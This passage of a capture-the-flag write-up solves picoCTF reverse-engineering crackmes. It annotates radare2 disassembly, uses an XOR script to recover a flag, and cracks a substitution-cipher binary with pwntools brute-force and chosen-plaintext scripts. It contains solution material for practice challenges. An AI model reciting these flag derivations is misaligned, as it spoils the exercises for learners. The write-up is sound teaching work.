|      :|   0<span style="color:#50fa7b">x080486de</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45e8</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">cpt</span>]			<span style="color:#6272a4">; eax = adresse of cpt</span>
|      :|   0<span style="color:#50fa7b">x080486e1</span>      <span style="color:#bd93f9">01</span><span style="color:#8be9fd;font-style:italic">d0</span>           <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd;font-style:italic">edx</span>				<span style="color:#6272a4">; eax = adresse of greetingMessage[cpt]</span>
|      :|   0<span style="color:#50fa7b">x080486e3</span>      <span style="color:#bd93f9">0</span><span style="color:#8be9fd;font-style:italic">fb600</span>         <span style="color:#8be9fd;font-style:italic">movzx</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">eax</span>]		<span style="color:#6272a4">; eax = greetingMessage[cpt]</span>
|      :|   0<span style="color:#50fa7b">x080486e6</span>      <span style="color:#bd93f9">3</span><span style="color:#8be9fd;font-style:italic">a45e3</span>         <span style="color:#8be9fd;font-style:italic">cmp</span> <span style="color:#8be9fd;font-style:italic">al</span>, <span style="color:#8be9fd">byte</span> [<span style="color:#8be9fd;font-style:italic">var_1dh</span>]		<span style="color:#6272a4">; if  greetingMessage[cpt] != xor_results then</span>
|     ,===&lt; 0<span style="color:#50fa7b">x080486e9</span>      <span style="color:#bd93f9">7504</span>           <span style="color:#8be9fd;font-style:italic">jne</span> <span style="color:#bd93f9">0x80486ef</span>			<span style="color:#6272a4">;</span>
|     |:|   0<span style="color:#50fa7b">x080486eb</span>      <span style="color:#bd93f9">8345</span><span style="color:#8be9fd;font-style:italic">e401</span>       <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">zero_var</span>], <span style="color:#bd93f9">1</span>		<span style="color:#6272a4">; 	zero_var++</span>
|     `---&gt; 0<span style="color:#50fa7b">x080486ef</span>      <span style="color:#bd93f9">837</span><span style="color:#8be9fd;font-style:italic">de419</span>       <span style="color:#8be9fd;font-style:italic">cmp</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">zero_var</span>], <span style="color:#bd93f9">0x19</span>		<span style="color:#6272a4">; else</span>
|     ,===&lt; 0<span style="color:#50fa7b">x080486f3</span>      <span style="color:#bd93f9">7512</span>           <span style="color:#8be9fd;font-style:italic">jne</span> <span style="color:#bd93f9">0x8048707</span>			<span style="color:#6272a4">; 	if zero_var == 0x19 then</span>
|     |:|   0<span style="color:#50fa7b">x080486f5</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">ec0c</span>         <span style="color:#8be9fd;font-style:italic">sub</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0xc</span>
|     |:|   0<span style="color:#50fa7b">x080486f8</span>      <span style="color:#bd93f9">68</span><span style="color:#8be9fd;font-style:italic">ab880408</span>     <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">str.You_are_winner</span>     		<span style="color:#6272a4">; 			0x80488ab ; &#34;You are winner!&#34;</span>
|     |:|   0<span style="color:#50fa7b">x080486fd</span>      <span style="color:#8be9fd;font-style:italic">e86efdffff</span>     <span style="color:#8be9fd;font-style:italic">call</span> <span style="color:#8be9fd;font-style:italic">sym.imp.puts</span>           		<span style="color:#6272a4">; 			int puts(const char *s)</span>
|     |:|   0<span style="color:#50fa7b">x08048702</span>      <span style="color:#bd93f9">83</span><span style="color:#8be9fd;font-style:italic">c410</span>         <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#bd93f9">0x10</span>
|    ,====&lt; 0<span style="color:#50fa7b">x08048705</span>      <span style="color:#8be9fd;font-style:italic">eb0c</span>           <span style="color:#8be9fd;font-style:italic">jmp</span> <span style="color:#bd93f9">0x8048713</span>			<span style="color:#6272a4">;			return</span>
|    |`---&gt; 0<span style="color:#50fa7b">x08048707</span>      <span style="color:#bd93f9">8345</span><span style="color:#8be9fd;font-style:italic">e801</span>       <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">cpt</span>], <span style="color:#bd93f9">1</span>			<span style="color:#6272a4">;	else	cpt++</span>
|    | :|   <span style="color:#6272a4">; CODE XREF from sym.do_magic @ 0x80486bb</span>
|    | :`-&gt; 0<span style="color:#50fa7b">x0804870b</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45e8</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">cpt</span>]			<span style="color:#6272a4">;} WHILE	( cpt &lt; length_of_our_input )</span>
|    | :    0<span style="color:#50fa7b">x0804870e</span>      <span style="color:#bd93f9">3</span><span style="color:#8be9fd;font-style:italic">b45f0</span>         <span style="color:#8be9fd;font-style:italic">cmp</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">length_of_our_input</span>] <span style="color:#6272a4">;</span>
|    | `==&lt; 0<span style="color:#50fa7b">x08048711</span>      <span style="color:#bd93f9">7</span><span style="color:#8be9fd;font-style:italic">caa</span>           <span style="color:#8be9fd;font-style:italic">jl</span> <span style="color:#bd93f9">0x80486bd</span>				<span style="color:#6272a4">;</span>
|    |      <span style="color:#6272a4">; CODE XREF from sym.do_magic @ 0x8048705</span>
|    `----&gt; 0<span style="color:#50fa7b">x08048713</span>      <span style="color:#8be9fd;font-style:italic">c9</span>             <span style="color:#8be9fd;font-style:italic">leave</span>
\           0<span style="color:#50fa7b">x08048714</span>      <span style="color:#8be9fd;font-style:italic">c3</span>             <span style="color:#8be9fd;font-style:italic">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>So we understand 0x19 first characters of the Greeting message needs to be xor with a secret message <em>sekrutBuffer</em> to get the flag.</p>
<p>We can use radare command <code>pcp [len]</code> to get the python representation of that <em>sekrutBuffer</em></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#bd93f9">0x080484e0</span>]<span style="color:#ff79c6">&gt;</span> pcp  <span style="color:#bd93f9">0x19</span> <span style="color:#ff79c6">@</span> obj<span style="color:#ff79c6">.</span>sekrutBuffer
<span style="color:#ff79c6">import</span> struct
buf <span style="color:#ff79c6">=</span> struct<span style="color:#ff79c6">.</span>pack (<span style="color:#f1fa8c">&#34;25B&#34;</span>, <span style="color:#ff79c6">*</span>[
<span style="color:#bd93f9">0x29</span>,<span style="color:#bd93f9">0x06</span>,<span style="color:#bd93f9">0x16</span>,<span style="color:#bd93f9">0x4f</span>,<span style="color:#bd93f9">0x2b</span>,<span style="color:#bd93f9">0x35</span>,<span style="color:#bd93f9">0x30</span>,<span style="color:#bd93f9">0x1e</span>,<span style="color:#bd93f9">0x51</span>,<span style="color:#bd93f9">0x1b</span>,<span style="color:#bd93f9">0x5b</span>,
<span style="color:#bd93f9">0x14</span>,<span style="color:#bd93f9">0x4b</span>,<span style="color:#bd93f9">0x08</span>,<span style="color:#bd93f9">0x5d</span>,<span style="color:#bd93f9">0x2b</span>,<span style="color:#bd93f9">0x5c</span>,<span style="color:#bd93f9">0x10</span>,<span style="color:#bd93f9">0x06</span>,<span style="color:#bd93f9">0x06</span>,<span style="color:#bd93f9">0x18</span>,<span style="color:#bd93f9">0x45</span>,
<span style="color:#bd93f9">0x51</span>,<span style="color:#bd93f9">0x00</span>,<span style="color:#bd93f9">0x5d</span>])
</code></pre></td></tr></table>
</div>
</div><p>Python implementation of the XOR to get the flag:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>
<span style="color:#ff79c6">import</span> pwn
secretbuffer<span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x29\x06\x16\x4f\x2b\x35\x30\x1e\x51\x1b\x5b\x14\x4b\x08\x5d\x2b\x5c\x10\x06\x06\x18\x45\x51\x00\x5d</span><span style="color:#f1fa8c">&#34;</span>
greeting <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;You have now entered the Duck Web, and you&#39;re in for a honkin&#39; good time.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">Can you figure out my trick?&#34;</span>

<span style="color:#8be9fd;font-style:italic">print</span> pwn<span style="color:#ff79c6">.</span>xor(secretbuffer, greeting)
</code></pre></td></tr></table>
</div>
</div><p>We get the flag, that we can verify if we pipe it to the binary: <code>python get_flag.py | ./main</code></p>
<h2 id="quackme-up">quackme-up</h2>
<ul>
<li><a href="./resources/quackme-up/main">main</a></li>
</ul>
<p>The program proposes us to encrypt a text and prompt back the resulting cipher. We can notice this is a simple substitution cipher, so reverse engineering is not necessary. There is 3 obvious ways to win this challenge:</p>
<ol>
<li>Bruteforce method (easy to implement but not so elegant)</li>
<li>guess the character substition tables (faster and efficient)</li>
<li>reverse engineer the algorithm</li>
</ol>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">./main
We<span style="color:#f1fa8c">&#39;re moving along swimmingly. Is this one too fowl for you?
</span><span style="color:#f1fa8c">Enter text to encrypt: picoCTF{
</span><span style="color:#f1fa8c">Here&#39;</span>s your ciphertext: <span style="color:#bd93f9">11</span> <span style="color:#bd93f9">80</span> <span style="color:#bd93f9">20</span> E0 <span style="color:#bd93f9">22</span> <span style="color:#bd93f9">53</span> <span style="color:#bd93f9">72</span> A1
Now quack it! : <span style="color:#bd93f9">11</span> <span style="color:#bd93f9">80</span> <span style="color:#bd93f9">20</span> E0 <span style="color:#bd93f9">22</span> <span style="color:#bd93f9">53</span> <span style="color:#bd93f9">72</span> A1 <span style="color:#bd93f9">01</span> <span style="color:#bd93f9">41</span> <span style="color:#bd93f9">55</span> <span style="color:#bd93f9">20</span> A0 C0 <span style="color:#bd93f9">25</span> E3 <span style="color:#bd93f9">45</span> <span style="color:#bd93f9">20</span> <span style="color:#bd93f9">35</span> <span style="color:#bd93f9">05</span> <span style="color:#bd93f9">70</span> <span style="color:#bd93f9">20</span> <span style="color:#bd93f9">95</span> <span style="color:#bd93f9">50</span> C1
That&#39;s all folks.
</code></pre></td></tr></table>
</div>
</div><p>Bruteforce method</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">import</span> pwn<span style="color:#ff79c6">,</span> re
<span style="color:#ff79c6">from</span> string <span style="color:#ff79c6">import</span> printable

pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;critical&#39;</span>

flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;picoCTF{&#39;</span>
<span style="color:#6272a4">#flag = &#39;&#39;</span>

<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#bd93f9">100</span>):
  <span style="color:#ff79c6">for</span> ch <span style="color:#ff79c6">in</span> printable:
    s <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>process(<span style="color:#f1fa8c">&#39;./main&#39;</span>)

    prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
    <span style="color:#6272a4">#print flag + ch</span>

    s<span style="color:#ff79c6">.</span>sendline(flag <span style="color:#ff79c6">+</span> ch)

    prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvall()
    <span style="color:#6272a4">#print prompt</span>

    your_cipher <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;Here&#39;s your ciphertext: (.*)&#34;</span>, prompt)[<span style="color:#bd93f9">0</span>]<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)
    cipher <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;quack it! : (.*)&#34;</span>, prompt)[<span style="color:#bd93f9">0</span>]<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)

    <span style="color:#6272a4">#print your_cipher</span>
    <span style="color:#ff79c6">if</span> <span style="color:#8be9fd;font-style:italic">all</span>([cipher[i] <span style="color:#ff79c6">==</span> your_cipher[i] <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(your_cipher))]):
        flag<span style="color:#ff79c6">+=</span>ch
        <span style="color:#8be9fd;font-style:italic">print</span> flag
        <span style="color:#ff79c6">if</span> ch <span style="color:#ff79c6">==</span> <span style="color:#f1fa8c">&#39;}&#39;</span>:
            exit()
        <span style="color:#ff79c6">break</span>
</code></pre></td></tr></table>
</div>
</div><p>Guessing the substitution table is trivial as we get the encrypted text of &lsquo;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@!_{}&rsquo;</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#6272a4">#!/usr/bin/env python</span>

<span style="color:#ff79c6">import</span> pwn<span style="color:#ff79c6">,</span> re
<span style="color:#ff79c6">from</span> string <span style="color:#ff79c6">import</span> printable

pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>log_level <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;critical&#39;</span>

alphabet <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ@!_</span><span style="color:#f1fa8c">{}</span><span style="color:#f1fa8c">&#39;</span>

s <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>process(<span style="color:#f1fa8c">&#39;./main&#39;</span>)
prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recv()
s<span style="color:#ff79c6">.</span>sendline(alphabet)
prompt <span style="color:#ff79c6">=</span> s<span style="color:#ff79c6">.</span>recvall()
your_cipher <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;Here&#39;s your ciphertext: (.*)&#34;</span>, prompt)[<span style="color:#bd93f9">0</span>]<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)
cipher <span style="color:#ff79c6">=</span> re<span style="color:#ff79c6">.</span>findall(<span style="color:#f1fa8c">&#34;quack it! : (.*)&#34;</span>, prompt)[<span style="color:#bd93f9">0</span>]<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)

substitution <span style="color:#ff79c6">=</span> {}
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> <span style="color:#8be9fd;font-style:italic">range</span>(<span style="color:#8be9fd;font-style:italic">len</span>(your_cipher)):
    substitution[your_cipher[i]] <span style="color:#ff79c6">=</span> alphabet[i]

flag <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;</span>
<span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> cipher:
    flag <span style="color:#ff79c6">+=</span> substitution[i]
<span style="color:#8be9fd;font-style:italic">print</span> flag
</code></pre></td></tr></table>
</div>
</div><p>Reverse engineer</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
